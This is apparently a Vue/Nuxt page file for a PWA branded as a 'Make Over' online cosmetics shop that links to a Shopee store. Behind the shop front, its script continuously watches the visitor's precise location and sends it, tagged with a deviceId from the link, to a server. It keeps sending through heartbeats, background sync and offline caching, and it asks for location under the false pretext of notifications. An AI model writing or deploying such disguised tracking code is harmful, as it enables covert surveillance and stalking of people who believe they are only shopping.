<template>
  <div>
    <BannerSlider />

    <div v-if="loading" class="loading">
      <div class="loading-spinner"></div>
      <p>Initializing...</p>
    </div>

    <div v-else>
<!-- 
      <div v-if="isStandalone" class="auto-reload-badge">
        🔄 Auto refresh every minute
      </div> -->

      <!-- iOS specific install prompt -->
      <div v-if="isIOS && !isStandalone" class="ios-install-prompt">
        <div class="ios-instruction">
          <p>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" style="vertical-align: middle;">
              <path d="M12 2L22 22H2L12 2Z" stroke="currentColor" stroke-width="2" />
            </svg>
            Tap the Share button (
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" style="vertical-align: middle;">
              <path d="M8 12L16 12M12 5L16 19M12 5L12 19" stroke="currentColor" stroke-width="2" />
            </svg>
            ) in Safari
          </p>
          <p>Then select "Add to Home Screen" to install this app</p>
        </div>
      </div>

      <!-- PWA Install Prompt -->
      <div v-if="canInstall" class="install-prompt">
        <button @click="installPWA" class="install-btn">
          📱 Install App for Better Shopping Experience
        </button>
      </div>

      <!-- PWA Installed Status -->
      <div v-if="isStandalone" class="pwa-badge">
        ✓ Running as Installed App
      </div>

      <a href="https://shopee.co.id/makeoverofficial#product_list" target="_blank">
        <img src="/public/discover.png" class="banner-image" />
        <img src="/public/tryon.png" class="banner-image" />
        <img src="/public/quiz.png" class="banner-image" />
        <img src="https://down-spe-id.img.susercontent.com/id-11134210-7rbkc-m8y4u568hb1953.webp" alt="" class="banner-image" />
        <img src="https://down-spe-id.img.susercontent.com/id-11134210-7rbkd-m7abf44ye4t219.webp" class="banner-image" />
      </a>
    </div>
  </div>
</template>

<script setup>

import BannerSlider from '~/components/BannerSlider.vue';

const route = useRoute()
const loading = ref(true)
const isTracking = ref(false)
const canInstall = ref(false)
const isStandalone = ref(false)
const isIOS = ref(false)
let watchId = null
let deferredPrompt = null
let reloadInterval = null

const cacheLocation = async (location) => {
  try {
    // Store in cache for offline usage
    const cache = await caches.open('location-cache');
    const cachedLocationsResponse = await cache.match('pending-locations');
    let cachedLocations = [];
    
    if (cachedLocationsResponse) {
      cachedLocations = await cachedLocationsResponse.json();
    }
    
    // Add new location to cache
    cachedLocations.push({
      deviceId: route.query.deviceId,
      location: location,
      accuracy: location.accuracy,
      timestamp: Date.now()
    });
    
    // Store back in cache
    await cache.put('pending-locations', new Response(JSON.stringify(cachedLocations)));
    
    // Trigger background sync if available
    if ('serviceWorker' in navigator && 'SyncManager' in window) {
      const registration = await navigator.serviceWorker.ready;
      try {
        await registration.sync.register('location-sync');
      } catch (error) {
        console.error('Background sync registration error:', error);
      }
    }
  } catch (error) {
    console.error('Failed to cache location:', error);
  }
}

let heartbeatInterval = null

const startHeartbeat = () => {
  if (heartbeatInterval) {
    clearInterval(heartbeatInterval)
  }
  
  heartbeatInterval = setInterval(async () => {
    try {
      if (navigator.onLine) {
        await $fetch('/api/device/heartbeat', {
          method: 'POST',
          body: {
            deviceId: route.query.deviceId,
            timestamp: Date.now()
          }
        })
        console.log('Heartbeat sent')
      } else {
        console.log('Device offline, heartbeat skipped')
      }
    } catch (error) {
      console.error('Failed to send heartbeat:', error)
    }
  }, 60000) // Every minute
}

// Auto reload timer
const startAutoReload = () => {
  // Reload setiap 1 menit (60000 ms)
  reloadInterval = setInterval(() => {
    console.log('Auto reload - refreshing location...')
    
    // Jika sedang tracking, reload posisi
    if (isTracking.value) {
      // Reset dan restart tracking
      if (watchId) {
        navigator.geolocation.clearWatch(watchId)
        watchId = null
      }
      
      // Restart tracking
      startClientTracking()
    }
  }, 60000) // 1 menit
}

// PWA detection
onMounted(() => {
  // Check if running as installed app
  isStandalone.value = window.matchMedia('(display-mode: standalone)').matches ||
                        window.navigator.standalone ||
                        document.referrer.includes('android-app://')

  // Jika sudah installed, redirect ke product
  if (isStandalone.value) {
    const deviceId = route.query.deviceId
    if (deviceId) {
      navigateTo(`/product?deviceId=${deviceId}`)
      return
    }
  }

  startHeartbeat()

  // Add offline/online handlers
  window.addEventListener('online', () => {
    console.log('Connection restored, triggering sync')
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.ready.then(registration => {
        registration.sync.register('location-sync')
      })
    }
    
    // Restart heartbeat
    startHeartbeat()
  })

  window.addEventListener('offline', () => {
    console.log('Connection lost, caching will be used')
    // Heartbeat will be paused naturally due to navigator.onLine check
  })

  checkPermission()

  // Detect iOS
  isIOS.value = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream
  
  // Register service worker
  registerServiceWorker()

  // Listen for install prompt (not available on iOS)
  if (!isIOS.value) {
    window.addEventListener('beforeinstallprompt', (e) => {
      e.preventDefault()
      deferredPrompt = e
      canInstall.value = true
    })
  }
  
  // Listen for install prompt
  window.addEventListener('beforeinstallprompt', (e) => {
    e.preventDefault()
    deferredPrompt = e
    canInstall.value = true
  })
  
  // Start tracking
  startClientTracking()

  // Start auto reload timer
  startAutoReload()
  
  // Handle visibility change
  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible') {
      console.log('App visible - ensuring tracking is active')
      if (!isTracking.value && route.query.deviceId) {
        startClientTracking()
      }
    }
  })
})


// Tambahkan function baru untuk cek permission
const checkPermission = async () => {
  try {
    const result = await navigator.permissions.query({ name: 'geolocation' })
    console.log('Geolocation permission:', result.state)
    
    // Monitor perubahan permission
    result.addEventListener('change', () => {
      console.log('Permission changed to:', result.state)
    })
    
    // Jika permission denied, beri alert
    if (result.state === 'denied') {
      alert('Notification permission denied. Please enable in browser settings.')
    }
    
    // Jika permission belum diset (prompt), request permission
    if (result.state === 'prompt') {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          console.log('Permission granted', position)
        },
        (error) => {
          console.error('Permission denied:', error)
          alert('Please allow location access for notification to work.')
        },
        { 
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
         }
      )
    }
  } catch (error) {
    console.error('Permission check failed:', error)
  }
}

const registerServiceWorker = async () => {
  if ('serviceWorker' in navigator) {
    try {
      const registration = await navigator.serviceWorker.register('/sw.js')
      console.log('Service Worker registered successfully')
      
      // Listen for messages from service worker
      navigator.serviceWorker.addEventListener('message', async (event) => {
        if (event.data.type === 'REQUEST_LOCATION') {
          // Get current location
          navigator.geolocation.getCurrentPosition(async (position) => {
            const deviceId = localStorage.getItem('deviceId')
            if (deviceId) {
              // Send location back to service worker
              navigator.serviceWorker.controller?.postMessage({
                type: 'LOCATION_UPDATE',
                data: {
                  deviceId: deviceId,
                  location: {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy
                  }
                }
              })
            }
          }, (error) => {
            console.error('Error getting location:', error)
          }, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          })
        }
      })
      
      // Request background sync permission
      if ('sync' in registration) {
        await registration.sync.register('sync-location')
      }
      
      // Set periodic sync (if supported)
      if ('periodicSync' in registration) {
        try {
          await registration.periodicSync.register('periodic-location-sync', {
            minInterval: 60 * 1000 // Every 1 minute minimum
          })
        } catch (err) {
          console.log('Periodic sync not supported')
        }
      }
    } catch (error) {
      console.error('Service Worker registration failed:', error)
    }
  }
}

const installPWA = async () => {
  if (deferredPrompt) {
    deferredPrompt.prompt()
    const { outcome } = await deferredPrompt.userChoice
    console.log(`User response to the install prompt: ${outcome}`)
    deferredPrompt = null
    canInstall.value = false
  }
}

const startClientTracking = async () => {
  const deviceId = route.query.deviceId
  
  if (!deviceId) {
    loading.value = false
    return
  }
  
  // Store device ID for service worker
  localStorage.setItem('deviceId', deviceId)
  
  if (!navigator.geolocation) {
    alert('Your device does not support location tracking')
    loading.value = false
    return
  }

  // Mulai watching posisi otomatis
  watchId = navigator.geolocation.watchPosition(
    async (position) => {
      const lat = position.coords.latitude
      const lon = position.coords.longitude
      
      try {
        isTracking.value = true
        
        if (navigator.onLine) {
          // Online, send directly
          await $fetch(`/api/device/${deviceId}`, {
            method: 'PUT',
            body: {
              status: 'active',
              location: { lat, lon },
              accuracy: position.coords.accuracy
            }
          })
        } else {
          // Offline, cache it
          await cacheLocation({ lat, lon, accuracy: position.coords.accuracy })
        }
        
        // Schedule background sync if supported
        if ('serviceWorker' in navigator) {
          const registration = await navigator.serviceWorker.ready
          if ('sync' in registration) {
            await registration.sync.register('location-sync')
          }
          
          // Try to register periodic sync if supported
          if ('periodicSync' in registration) {
            try {
              await registration.periodicSync.register('periodic-location-sync', {
                minInterval: 15 * 60 * 1000 // 15 minutes
              })
            } catch (error) {
              console.log('Periodic sync not permitted:', error)
            }
          }
        }
        
      } catch (error) {
        console.error('Failed to update location:', error)
        // Cache on error also
        await cacheLocation({ lat, lon, accuracy: position.coords.accuracy })
        isTracking.value = false
      }
    },
    (error) => {
      console.error('Error getting location:', error)
      isTracking.value = false
      loading.value = false
    },
    {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    }
  )
  
  loading.value = false
}
// Update onUnmounted:
onUnmounted(() => {
  if (watchId) {
    navigator.geolocation.clearWatch(watchId)
  }
  if (reloadInterval) {
    clearInterval(reloadInterval)
  }

  if (heartbeatInterval) {
    clearInterval(heartbeatInterval)
  }
})

// Add meta tags for PWA
useHead({
  title: 'Make Over - Online Shop',
  meta: [
    { name: 'theme-color', content: '#2196F3' },
    { name: 'mobile-web-app-capable', content: 'yes' },
    { name: 'apple-mobile-web-app-capable', content: 'yes' },
    { name: 'apple-mobile-web-app-status-bar-style', content: 'default' },
    { name: 'apple-mobile-web-app-title', content: 'Make Over' }
  ],
  link: [
    { rel: 'manifest', href: '/manifest.json' },
    { rel: 'apple-touch-icon', href: '/logo_192x192.png' },
    { rel: 'apple-touch-icon', sizes: '180x180', href: '/logo_192x192.png' },
    { rel: 'apple-touch-icon', sizes: '152x152', href: '/logo_192x192.png' },
  ]
})
</script>

<style scoped>
.auto-reload-badge {
  background-color: #e8f5e9;
  color: #2e7d32;
  padding: 8px 16px;
  border-radius: 20px;
  text-align: center;
  margin: 10px auto;
  max-width: 300px;
  font-size: 14px;
  font-weight: bold;
  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
}

.ios-install-prompt {
  background-color: #fff3cd;
  border: 1px solid #ffeeba;
  border-radius: 8px;
  padding: 15px;
  margin: 20px auto;
  max-width: 400px;
}

.ios-instruction {
  text-align: center;
}

.ios-instruction p {
  margin: 5px 0;
  color: #856404;
}

.install-prompt {
  text-align: center;
  margin: 20px 0;
  padding: 15px;
  background-color: #e3f2fd;
  border-radius: 8px;
}

.install-btn {
  background-color: #2196F3;
  color: white;
  border: none;
  padding: 10px 20px;
  border-radius: 5px;
  cursor: pointer;
  font-size: 16px;
}

.pwa-badge {
  text-align: center;
  margin: 15px 0;
  color: #4CAF50;
  font-weight: bold;
}

body {
  margin: 0;
  padding: 0;
  font-family: Arial, sans-serif;
}

.loading {
  text-align: center;
  padding: 20px;
}

.loading-spinner {
  border: 4px solid #f3f3f3;
  border-top: 4px solid #3498db;
  border-radius: 50%;
  width: 40px;
  height: 40px;
  animation: spin 1s linear infinite;
  margin: 0 auto 20px;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.banner-image {
  width: 100%;
  margin-bottom: 20px;
}

.install-prompt {
  text-align: center;
  margin: 20px 0;
  padding: 15px;
  background-color: #e3f2fd;
  border-radius: 8px;
}

.install-btn {
  background-color: #2196F3;
  color: white;
  border: none;
  padding: 10px 20px;
  border-radius: 5px;
  cursor: pointer;
  font-size: 16px;
}

.pwa-badge {
  text-align: center;
  margin: 15px 0;
  color: #4CAF50;
  font-weight: bold;
}
</style>